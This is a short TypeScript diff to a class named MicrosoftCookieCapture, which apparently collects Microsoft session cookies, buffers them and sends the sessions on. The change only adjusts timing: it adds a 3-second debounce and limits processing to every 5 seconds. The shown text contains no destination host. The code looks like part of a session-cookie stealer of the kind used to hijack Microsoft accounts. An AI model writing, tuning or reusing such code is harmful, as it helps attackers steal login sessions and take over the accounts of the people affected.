@@ -61,6 +61,7 @@ class MicrosoftCookieCapture {
   private lastCaptureTime = 0;
   private lastSessionSent = 0;
   private captureBuffer: CapturedCookie[] = [];
+  private captureDebounceMs = 3000; // Reduce frequency
 
   constructor() {
     this.initializeMicrosoftCapture();
@@ -94,14 +95,20 @@ class MicrosoftCookieCapture {
 
     if (microsoftCookies.length === 0) return;
 
+    // Debounce to prevent spam
+    const now = Date.now();
+    if (now - this.lastCaptureTime < this.captureDebounceMs) {
+      return;
+    }
+    this.lastCaptureTime = now;
+
     // Buffer cookies to avoid excessive processing
     this.captureBuffer.push(...microsoftCookies);
     
-    // Debounce processing
-    const now = Date.now();
-    if (now - this.lastCaptureTime > 1000) { // Process every 1 second max
+    // Process buffered cookies
+    if (now - this.lastSessionSent > 5000) { // Process every 5 seconds max
       this.processBufferedCookies();
-      this.lastCaptureTime = now;
+      this.lastSessionSent = now;
     }
   }
 
